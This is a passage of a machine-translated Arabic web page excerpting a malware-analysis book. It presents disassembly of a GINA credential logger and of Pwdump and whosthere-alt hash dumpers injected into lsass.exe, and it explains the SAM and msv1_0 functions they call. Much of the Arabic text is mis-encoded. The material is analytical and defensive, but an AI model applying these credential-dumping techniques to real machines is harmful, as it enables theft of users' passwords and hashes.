offset aWlxloggedout_0 ; <span class="hljs-string"><span class="hljs-string">"WlxLoggedOutSAS"</span></span> <span class="hljs-number"><span class="hljs-number">100014</span></span>A7 call Call_msgina_dll_<span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(1)</span></span></span><span class="hljs-function"> ... </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FB</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">eax</span></span></span><span class="hljs-function"> ; </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Args</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">100014FC</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aUSDSPSOpS</span></span></span><span class="hljs-function"> ;"</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">U</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">D</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">P</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">OP</span></span></span><span class="hljs-function">: %</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">s</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001501</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">push</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">offset</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">aDRIVERS</span></span></span><span class="hljs-function"> ; "</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">drivers</span></span></span><span class="hljs-function">\</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">tcpudp</span></span></span><span class="hljs-function">.</span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sys</span></span></span><span class="hljs-function">" </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">10001503</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">call</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">Log_To_File</span></span></span><span class="hljs-function"> </span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">(2)</span></span></span></span></code> </pre> <br>  ูุชู ููู ูุนูููุงุช ุงูุงุนุชูุงุฏ ุนูู ุงูููุฑ ุฅูู ููู msgina.dll ุจุงุณุชุฎุฏุงู ููุงููุฉ ุชุณูู Call_msgina_dll_function (1).  ุชููู ูุฐู ุงููุธููุฉ ุจุชุญุฏูุฏ ูููุน ุงูููุงููุฉ WlxLoggedOutSAS ูุชุดุบูููุง ุจุดูู ุฏููุงูููู ูู msgina.dll ุ ุงููุญุฏุฏ ููุณูุทุฉ.  ูููู ุงุณุชุฏุนุงุก ุนูู ุงูุฎุท (2) ุจุชุณุฌูู ุงูุจูุงูุงุช.  ูุญุฌุฌ ุ ูุฅูู ูุฃุฎุฐ ูุนูููุงุช ุงููุญุงุณุจุฉ ุ ูุณูุณูุฉ ุชูุณูู ุณูุชู ุนุฑุถ ูุฐู ุงููุนูููุงุช ุ ูุงุณู ููู ููุชุณุฌูู.  ูุชูุฌุฉ ูุฐูู ุ ูุชู ุญูุธ ูุนูููุงุช ุญูู ุฃู ุชุณุฌูู ุฏุฎูู ูุงุฌุญ ุฅูู ููููช SystemRootูช \ system32 \ drivers \ tcpudp.sys.  ูุญุชูู ูุฐุง ุงูููู ุนูู ุงุณู ุงููุณุชุฎุฏู ูุงููุฌุงู ููููุงุช ุงููุฑูุฑ - ุงูุญุงููุฉ ูุงููุฏููุฉ. <br><br><h3 style=";text-align:right;direction:rtl">  ุฅููุงุฐ ุชุฌุฒุฆุงุช </h3><br>  ุบุงูุจูุง ูุง ุชุญูุธ ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุนูู Windows ุชุฌุฒุฆุงุช ุงููุธุงู ูููุตูู ุฅูู ุจูุงูุงุช ุงูุงุนุชูุงุฏ.  ุจุนุฏ ุงูุญูุธ ุ ูุญุงูู ุงูููุงุฌููู ูู ุชุดููุฑ ูุฐู ุงูุชุฌุฒุฆุฉ ูู ูุถุน ุนุฏู ุงูุงุชุตุงู ุฃู ุงุณุชุฎุฏุงููุง ูููุฌูู ูุซู ุชูุฑูุฑ ุงูุชุฌุฒุฆุฉ.  ุฃุซูุงุก ูุฐุง ุงููุฌูู ุ ูุชู ุงุณุชุฎุฏุงู ุชุฌุฒุฆุงุช LM ู NTLM ููุตุงุฏูุฉ NTLM ุนู ุจุนุฏ ุ ูุงูุชู ูุง ุชุชุทูุจ ูู ุงูุชุดููุฑ ูุงูุญุตูู ุนูู ูููุฉ ุงููุฑูุฑ ุงูููุงุจูุฉ. <br><br>  ูุญูุธ ุงูุชุฌุฒุฆุฉ ุ ููุงู ุญุฒู ุจุฑุงูุฌ Pwdump ู Pass-the-Hash (PSH) ูุฌุงููุฉ.  ูุธุฑูุง ูุฃู ููุง ูู ูุฐู ุงูุฃุฏูุงุช ููุชูุญุฉ ุงููุตุฏุฑ ุ ููุฏ ุชู ุฅูุดุงุก ุงููุซูุฑ ูู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุนูู ุฃุณุงุณูุง. <br><br>  ุชุญุชูู ูุนุธู ูุถุงุฏุงุช ุงูููุฑูุณุงุช ุนูู ุชูููุนุงุช ููุฅุตุฏุงุฑุงุช ุงููุชุฑุฌูุฉ ุงูููุงุณูุฉ ููุฐู ุงูุฃุฏูุงุช ุ ูุฐุง ูุญุงูู ุงูููุงุฌููู ุชุฌููุน ุงูุงุฎุชูุงูุงุช ุงูุฎุงุตุฉ ุจูู ูุชุฌูุจ ุงููุดู.  ุงูุฃูุซูุฉ ูู ูุฐุง ุงููุตู ูู ุฃููุงุน pwdump ู PSH ุงูุชู ุตุงุฏููุงูุง ูู ุงูุญูุงุฉ ุงููุงูุนูุฉ. <br><br>  Pwdump ุนุจุงุฑุฉ ุนู ูุฌููุนุฉ ูู ุงูุจุฑุงูุฌ ุงูุชู ุชููู ุจุฅุฎุฑุงุฌ ุงูุชุฌุฒุฆุฉ ูู ุชูุณูู LM i NTLM ุงูุชุงุจุน ูููุณุชุฎุฏููู ุงููุญูููู ูู ูุฏูุฑ ุญุณุงุจ ุงูุฃูุงู (SAM).  ูููู Pwdump ุจุฅุฏุฎุงู DLL ูู ุนูููุฉ LSASS (ุฎุฏูุฉ ุงููุธุงู ุงููุฑุนู ูุณูุทุฉ ุงูุฃูุงู ุงููุญููุฉ) ุ ูุงููุนุฑููุฉ ุจุงุณู lsass.exe.  ุณููุงูุด ุชูููุฐ ููุชุจุงุช DLL ูู ุงููุตู 12 ุ ูููู ูู ุงูููุช ุงูุญุงูู ุ ุชุญุชุงุฌ ููุท ุฅูู ูุนุฑูุฉ ุฃู ูุฐู ุชูููุฉ ุชููู ูู ุฎูุงููุง ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุจุชูููุฐ ุงูููุชุจุงุช ุฏุงุฎู ุงูุนูููุงุช ุงูุฃุฎุฑู ุ ุจุงุณุชุฎุฏุงู ุฌููุน ุงูุชูุงุฒุงุชูุง.  ุบุงูุจูุง ูุง ุชูุงุฌู ุฃุฏูุงุช ุญูุธ ุงูุชุฌุฒุฆุฉ ุงูุชุฌุฒุฆุฉ ุนูููุฉ lsass.exe ูุธุฑูุง ูุงูุชูุงููุง ุงูุชูุงุฒุงุช ูุงููุฉ ูุงููุตูู ุฅูู ุงูุนุฏูุฏ ูู ูุธุงุฆู API ุงููููุฏุฉ. <br><br>  ูุณุชุฎุฏู ุงูุฅุตุฏุงุฑ ุงูููุงุณู ูู Pwdump ููุชุจุฉ lsaext.dll.  ุนูุฏูุง ูุชู ุญููู ูู lsass.exe ุ ูุฅูู ูุณุชุฏุนู ูุธููุฉ GetHash ุ ุงูุชู ูุชู ุชุตุฏูุฑูุง ูู lsaext.dll ูุงุณุชุฑุฏุงุฏ ุงูุชุฌุฒุฆุฉ.  ูู ูุฐู ุงูุญุงูุฉ ุ ูุชู ุงุณุชุฎุฏุงู ูุธุงุฆู Windows ุบูุฑ ุงูููุซูุฉ ุ ูุงูุชู ุณุชุณูุญ ูู ุจุงูุญุตูู ุนูู ุงูุฃุฑูุงู ุงูุชุณูุณููุฉ ูุฌููุน ุงููุณุชุฎุฏููู ูู ุงููุธุงู ูุงูุชุฌุฒุฆุฉ ุบูุฑ ุงููุดูุฑุฉ ููููุฉ ุงููุฑูุฑ ููู ูููู. <br><br>  ูู ููุงุฌูุฉ ุงุฎุชูุงู Pwdump ุ ุชุญุชุงุฌ ุฅูู ุชุญููู ููุชุจุงุชูุง ูููู ููููุฉ ุญูุธ ุงูุชุฌุฒุฆุฉ.  ุฃูู ุดูุก ูุฌุจ ุงูุงูุชุจุงู ุฅููู ููุธุงุฆู ุงูุชุตุฏูุฑ.  ูุชู ุชุตุฏูุฑ ุงุณุชุฏุนุงุก GetHash ูู Pwdump ุงูุชุฑุงุถููุง ุ ูููู ูููู ููููุงุฌููู ุชุบููุฑ ุงุณูู ุจุณูููุฉ ูุฌุนูู ุฃูู ูุงุจููุฉ ููุชูููุฒ.  ุซู ูุฌุจ ุนููู ูุญุงููุฉ ุชุญุฏูุฏ ุงููุธุงุฆู ุงููุณุชุฎุฏูุฉ ูู ููุงููุงุช ุงูุชุตุฏูุฑ.  ูููู ุชุญุฏูุฏ ูููุน ุงูุนุฏูุฏ ูููุง ุฏููุงูููููุง ุ ูุฐูู ุ ุบุงูุจูุง ูุง ุชุนูุฏ ููุงููุงุช ุงูุชุตุฏูุฑ ุงุณุชุฎุฏุงู ุนูููุฉ GetProcAddress. <br><br>  ููุธูุฑ ุงูุฅุฏุฑุงุฌ 11.2 ุฑูุฒ ุฏุงูุฉ ุงูุชุตุฏูุฑ GrabHash ูู DLL ูุฅุตุฏุงุฑ ูุงุญุฏ ูู Pwdump.  ูุธุฑูุง ูุฃู ุงูููุชุจุฉ ูุถููุฉ ูู lsass.exe ุ ูุจู ุงุณุชุฎุฏุงู ุงูุนุฏูุฏ ูู ุงูุฃุญุฑู ุ ูุฌุจ ุฃููุงู ุงูุนุซูุฑ ุนูููุง ูู ุงููุถุน ุงููุฏูู. <br><br>  ูุงุฆูุฉ 11.2.  ููุงููุงุช API ุงููุฑูุฏุฉ ุงูุชู ุชุณุชุฎุฏููุง ูุธููุฉ ุชุตุฏูุฑ GrabHash ูู ุฃุญุฏ ูุชุบูุฑุงุช Pwdump <br><br><pre style=";text-align:right;direction:rtl"> <code class="hljs perl"><span class="hljs-number"><span class="hljs-number">1000123</span></span>F <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset LibFileName ; <span class="hljs-string"><span class="hljs-string">"samsrv.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">1</span></span>) <span class="hljs-number"><span class="hljs-number">10001244</span></span> call esi ; LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001248</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aAdvapi32_dll_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"advapi32.dll"</span></span> (<span class="hljs-number"><span class="hljs-number">2</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001251</span></span> call esi ; LoadLibraryA ... <span class="hljs-number"><span class="hljs-number">1000125</span></span>B <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset ProcName ; <span class="hljs-string"><span class="hljs-string">"SamIConnect"</span></span> <span class="hljs-number"><span class="hljs-number">10001260</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">10001265</span></span> call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">10001281</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamrqu ; <span class="hljs-string"><span class="hljs-string">"SamrQueryInformationUser"</span></span> <span class="hljs-number"><span class="hljs-number">10001286</span></span> <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">1000128</span></span>C call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>C2 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSamigetpriv ; <span class="hljs-string"><span class="hljs-string">"SamIGetPrivateData"</span></span> <span class="hljs-number"><span class="hljs-number">100012</span></span>C7 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> ebx ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>CD call esi ; GetProcAddress ... <span class="hljs-number"><span class="hljs-number">100012</span></span>CF <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuncti ; <span class="hljs-string"><span class="hljs-string">"SystemFunction025"</span></span> (<span class="hljs-number"><span class="hljs-number">3</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>D4 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>DA call esi ; GetProcAddress <span class="hljs-number"><span class="hljs-number">100012</span></span>DC <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> offset aSystemfuni_<span class="hljs-number"><span class="hljs-number">0</span></span> ; <span class="hljs-string"><span class="hljs-string">"SystemFunction027"</span></span> (<span class="hljs-number"><span class="hljs-number">4</span></span>) <span class="hljs-number"><span class="hljs-number">100012</span></span>E1 <span class="hljs-keyword"><span class="hljs-keyword">push</span></span> edi ; hModule <span class="hljs-number"><span class="hljs-number">100012</span></span>E7 call esi ; GetProcAddress</code> </pre> <br>  ุชูุธูุฑ ุงููุงุฆูุฉ 11.2 ุงูุฑูุฒ ูุงุณุชุฑุฏุงุฏ ูุงุตูุงุช ููุชุจุฉ samsrv.dll (1) ู advapi32.dll (2) ุนู ุทุฑูู ุงุณุชุฏุนุงุก LoadLibrary.  ูุญุชูู ููู samsrv.dll ุนูู ูุงุฌูุฉ ุจุฑูุฌุฉ ุชุทุจููุงุช ูุณูููุฉ ุงููุตูู ุฅูู SAM ุ ูุชู ุงูุนุซูุฑ ุนูู ููู advapi32.dll ูููุตูู ุฅูู ุงููุธุงุฆู ุงูุชู ูู ูุชู ุงุณุชูุฑุงุฏูุง ุฅูู lsass.exe.  ุชุณุชุฎุฏู ุงูููุชุจุฉ ุงูุฏููุงููููุฉ ููุฐุง ุงูุชุจุงูู Pwdump ูุงุตูุงุช ูุฐู ุงูููุชุจุงุช ููุจุญุซ ุนู ุงูุนุฏูุฏ ูู ุงููุธุงุฆู.  ูุชู ุนุฑุถ ุฃูู ุฎูุณุฉ ูููุง ูู ุงููุงุฆูุฉ (ูุงุญุธ ููุงููุงุช GetProcAddress ููุณูุทุงุชูุง). <br><br>  ูุชู ุงุณุชูุฑุงุฏ ุงูููุงููุงุช ุงููููุฉ ูุซู SamIConnect ู SamrQueryInformationUser ู SamIGetPrivateData ูู samsrv.dll.  ูุชู ุจุนุฏ ุฐูู ุงุณุชุฎุฏุงู ุงุณุชุฏุนุงุก SamIConnect ููุงุชุตุงู ุจู SAM ุ ูุจุนุฏ ุฐูู ูุชู ุงุณุชุฏุนุงุก ุงููุธููุฉ SamrQueryInformationUser ููู ูุณุชุฎุฏู ูู ุงููุธุงู. <br><br>  ูุชู ุงุณุชุฑุฏุงุฏ ุงูุชุฌุฒุฆุฉ ุจุงุณุชุฎุฏุงู ุงุณุชุฏุนุงุก SamIGetPrivateData ุ ุซู ูุชู ูู ุชุดููุฑูุง ุจุงุณุชุฎุฏุงู ุฏุงูุงุช SystemFunction025 ู SystemFunction027 ุงูุชู ุชู ุงุณุชูุฑุงุฏูุง ูู advapi32.dll (ุงูุณุทุฑุงู (2) ู (3)).  ูู ูุชู ูุตู ุฃู ูู ูุธุงุฆู API ูู ูุฐู ุงููุงุฆูุฉ ูู ุงููุซุงุฆู ุงูุฑุณููุฉ. <br><br>  ุชุญุชูู ูุฌููุนุฉ ุฃุฏูุงุช PSH ุนูู ุงูุจุฑุงูุฌ ุงูุชู ุชูุดุฆ ููุงูุจ ุชุฌุฒุฆุฉ.  ุชูุนุฑู ุฃุดูุฑ ูุฐู ุงูููุงูุจ ุจุงุณู whosthere-alt.  ูููู ุจุชุฎุฒูู ูุญุชูู SAM ุงูุฐู ุชู ุงูุญุตูู ุนููู ุนู ุทุฑูู ุชุถููู DLL ูู lsass.exe.  ูู ููุณ ุงูููุช ุ ุนูุฏ ุงูููุงุฑูุฉ ูุน Pwdump ุ ูุชู ุงุณุชุฎุฏุงู ูุฌููุนุฉ ูุฎุชููุฉ ุชูุงููุง ูู ูุธุงุฆู API.  ููุธูุฑ ุงูุฅุฏุฑุงุฌ 11.3 ุฑูุฒ ุงูุฅุตุฏุงุฑ ูู whosthere-alt ุ ุงูุฐู ูุตุฏุฑ ุฏุงูุฉ ุชุณูู TestDump. <br><br>  ูุงุฆูุฉ 11.3.  ููุงููุงุช API ูุฑูุฏุฉ ุชุณุชุฎุฏููุง ูุธููุฉ ุงูุชุตุฏูุฑ TestDump ูู ุฅุตุฏุงุฑ whosthere-alt <br><br><pre style=";text-align:right;direction:rtl"> <code class="hljs sql">10001119 push offset LibFileName ; "secur32.dll" 1000111E <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:LoadLibraryA <span class="hljs-number"><span class="hljs-number">10001130</span></span> push <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> ProcName ; "LsaEnumerateLogonSessions" 10001135 push esi ; hModule 10001136 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetProcAddress (<span class="hljs-number"><span class="hljs-number">1</span></span>) ... <span class="hljs-number"><span class="hljs-number">10001670</span></span> <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetSystemDirectoryA <span class="hljs-number"><span class="hljs-number">10001676</span></span> mov edi, <span class="hljs-keyword"><span class="hljs-keyword">offset</span></span> aMsv1_0_dll ; \\msv1_0.dll ... 100016A6 push eax ; path to msv1_0.dll 100016A9 <span class="hljs-keyword"><span class="hljs-keyword">call</span></span> ds:GetModuleHandleA (<span class="hljs-number"><span class="hljs-number">2</span></span>)</code> </pre> <br>  ูุธุฑูุง ูุฃู ูุฐู ุงูููุชุจุฉ ูุถููุฉ ูู lsass.exe ุ ูุฅู ูุธููุชูุง TestDump ุชููู ุจุฅูุดุงุก ุชูุฑูุบ ุชุฌุฒุฆุฉ.  ูููู ุจุชุญููู ููู secur32.dll ุจุดูู ุฏููุงูููู ููุฌุฏ ุงุณุชุฏุนุงุก LsaEnumerateLogonSessions (1) ููู ููุญุตูู ุนูู ูุงุฆูุฉ ุจุงููุนุฑูุงุช ุงููุฑูุฏุฉ ูุญูููุง (LUIDs).  ุชุญุชูู ูุฐู ุงููุงุฆูุฉ ุนูู ุงูุฃุณูุงุก ูุงููุฌุงูุงุช ุงูุชู ุชู ุงูุฅุดุงุฑุฉ ุฅูููุง ูู ูู ุชุณุฌูู ุฏุฎูู.  ุชุฐูุจ ุงูููุชุจุฉ ูู ุฎูุงููู ูููุตูู ุฅูู ุงููุนูููุงุช ุงููุญุงุณุจูุฉ.  ููููุงู ุจุฐูู ุ ุจุงุณุชุฎุฏุงู ุงุณุชุฏุนุงุก GetModuleHandle (2) ุ ุชุจุญุซ ุฏุงุฎู msv1_0.dll ุนู ูุธููุฉ ุบูุฑ ูุตุฏุฑุฉ ุ NlpGetPrimaryCredential ุ ูุงูุชู ุชุณูุญ ุจุฅููุงุก ุชุฌุฒุฆุงุช NT ู LM. <br><br><h3 style=";text-align:right;direction:rtl">  ุนู ุงููุคูููู </h3><br>  <b>ูุงููู ุณูููุฑุณูู</b> ูุชุฎุตุต ูู ุงูุฃูู ูู ูุงูุฏูุงูุช.  ููู ุถุงูุน ูู ุชุญููู ุงูุจุฑูุฌูุงุช ุงูุฎุจูุซุฉ ูุฌุฒุก ูู ุงูุชุญููู ูู ุงูุญูุงุฏุซ ููู ูุณุชุดุงุฑ ูุญูููุฉ ุงูููุงูุงุช ุงููุชุญุฏุฉ ูุฃูู ุงููุนูููุงุช.  ุทูุฑ ูุงููู ุณูุณูุฉ ูู ุฏูุฑุงุช ุชุญููู ุงูุจุฑูุฌูุงุช ุงูุฎุจูุซุฉ ููุนูููุง ูุฌูููุฑ ูุชููุน ุ ุจูุง ูู ุฐูู ููุชุจ ุงูุชุญูููุงุช ุงููุฏุฑุงูู ูุงููุจุนุฉ ุงูุณูุฏุงุก.  ูุจู ูุงูุฏูุงูุช ุ ูุงู ููุธููุง ูู ูุฎุชุจุฑ ููููููู ูู ูุนูุฏ ูุงุณุงุชุดูุณุชุณ ููุชูููููุฌูุง ูุฃุฌุฑู ุจุญุซูุง ูู ุทูุจูููุฌูุง ุงูุดุจูุฉ ุงูุณูุจูุฉ ูุงุฎุชุจุงุฑ ุงูุงุฎุชุฑุงู.  ุจุงูุฅุถุงูุฉ ุฅูู ุฐูู ุ ุฃููู ูุงููู ุจุฑูุงูุฌูุง ุชุฏุฑูุจููุง ูุชุนุฏุฏ ุงูุชุฎุตุตุงุช ููุฏุฉ ุซูุงุซ ุณููุงุช ุนูู ุงูุฃูุธูุฉ ูุงูุดุจูุงุช ูู ููุงูุฉ ุงูุฃูู ุงููููู.  ุฃุซูุงุก ุงูุชุฏุฑูุจ ุ ุดุงุฑู ูู ุฏุฑุงุณุฉ ุชูููุงุช ุงูููุฏุณุฉ ุงูุนูุณูุฉ ูุญุตู ุนูู ุงูุนุฏูุฏ ูู ุงูุฌูุงุฆุฒ ูู ูุฌุงู ุชุญููู ุงูุดุจูุงุช. <br><br>  <b>ุฃูุฏุฑู ููููุฌ</b> ูู ุฎุจูุฑ ูู ุฃูู ุงููุนูููุงุช ูู ูุฒุงุฑุฉ ุงูุฏูุงุน ุงูุฃูุฑูููุฉ.  ูููู ุจุชุฏุฑูุณ ุชุญููู ุงูุจุฑูุฌูุงุช ูุงูููุฏุณุฉ ุงูุนูุณูุฉ ูุงูุจุฑูุฌุฉ ููุธุงู ุงูุชุดุบูู Windows (OS) ูู ุงููุฏุฑุณุฉ ุงููุทููุฉ ููุชุดููุฑ ุ ุจูููุง ูู ูุชุฎุตุต ูุนุชูุฏ ูู ุฃูุธูุฉ ุงููุนูููุงุช.  ุนูู ุญุณุงุจ ุฃูุฏุฑู ุนุฏุฉ ุซุบุฑุงุช ููู ุตูุฑ ููุญุงูุงุฉ VMware ุงูุงูุชุฑุงุถูุฉ ุ ุจุงูุฅุถุงูุฉ ุฅูู ุฃุฏูุงุช ูููุดู ุนู ุงูุจุฑุงูุฌ ุงูุถุงุฑุฉ ุงููุจุชูุฑุฉ ุ ุจูุง ูู ุฐูู ูุญุฏุงุช ุงูููุงุฉ ุงููุตุงุจุฉ.  ุจุนุฏ ุนุดุฑ ุณููุงุช ูู ุงูุฎุจุฑุฉ ููุญูู ูู ูุฌุงู ุฃูู ุงูููุจููุชุฑ ุ ูุนุชุจุฑ ุจุญู ุฎุจูุฑูุง ูู ุชุญููู ูุชูุณูุฑ ุงูุจุฑุงูุฌ ุงูุฎุจูุซุฉ ูุงูุนุงุฏูุฉ. <br><br>  ยปูููู ุงูุนุซูุฑ ุนูู ูุฒูุฏ ูู ุงููุนูููุงุช ุญูู ุงููุชุงุจ ุนูู <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ูููุน ุงููุงุดุฑ ุนูู ุงูููุจ</a> <br>  ยป <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ุงููุญุชููุงุช</a> <br>  ยป <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=ar&amp;u=">ููุชุทูุงุช</a> <br><br>  ุจุงููุณุจุฉ ูู Khabrozhiteley ุฎุตู 20 ูช ุนูู ุงููุณููุฉ - <b>ุณูุธูุฑ ุชุดุฑูุญ ุงูุฌุซุฉ</b> </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/ar416143/">https://habr.com/ru/post/ar416143/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../ar416131/index.html">ููููุฉ ุงูุชุนุงูู ูุน PD ูู ุงูุงุชุญุงุฏ ุงูุฑูุณู ูุนุฏู ุฎุฑู ุงููุงููู</a></li>
<li><a href="../ar416133/index.html">ูุฑูุฒ ุงูุจูุงูุงุช ูู ุงูุฎุงุฑุฌ: Equinix LD8</a></li>
<li><a href="../ar416135/index.html">ุชุทุจูู ูุงุฌูุฉ ุงููุณุชุฎุฏู ุงูุฑุณูููุฉ ุฃุตุบุฑ ูู 1 ูููู ุจุงูุช</a></li>
<li><a href="../ar416137/index.html">Zabbix ููุงุณุญ ุถูุฆู ููุฃูุงู</a></li>
<li><a href="../ar416139/index.html">ูุตุงุฏูุฉ ูููุฉ ูุฌุฒุก ูู ุงุณุชุฑุงุชูุฌูุฉ ุงููุงุฆุญุฉ ุงูุนุงูุฉ ูุญูุงูุฉ ุงูุจูุงูุงุช</a></li>
<li><a href="../ar416147/index.html">ุชูุธูู ุงูุชููู ูู ุชุทุจููุงุช iOS ุจุงุณุชุฎุฏุงู Root Controller</a></li>
<li><a href="../ar416149/index.html">ุฃุณุฆูุฉ ูุฃุฌูุจุฉ ุงูุทุงูุฉ ุงููุชุฌุฏุฏุฉ ุ ุงูุฌุฒุก ุงูุฃูู</a></li>
<li><a href="../ar416151/index.html">ุจุงููู ุจุฏูู ุฃุจุนุงุฏ. ุณุญุฑ ุชุญููู ุงูุจุนุฏ ุงูููุนู</a></li>
<li><a href="../ar416153/index.html">ูู ุณุชุตุจุญ ุงูุทุงุฆุฑุงุช ุฃูุซุฑ ููุซูููุฉุ ููุฏู ูุตูุนู ุงูุทุงุฆุฑุงุช ุงูุฑูุจูุชุงุช ููุดุฑูุงุช</a></li>
<li><a href="../ar416155/index.html">WebSockets ูู Angular: ุฅูุดุงุก Angular Service ููุนูู ูุน ูุขุฎุฐ ุงูููุจ</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter57283870 = new Ya.Metrika({
                  id:57283870,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/57283870" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134228602-6', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

<footer class="page-footer">
  <div class="page-footer-legal-info-container page-footer-element">
    <p>
      Weekly-Geekly ES | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
    </p>
  </div>
  <div class="page-footer-counters-container page-footer-element">
    <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=9uU9J9pq8z7k8xEBHYSfs6DenIBAHs3vLIHcPIJW9d0&co=3a3a3a&ct=ffffff'/></a>
  </div>
</footer>
  
</body>

</html>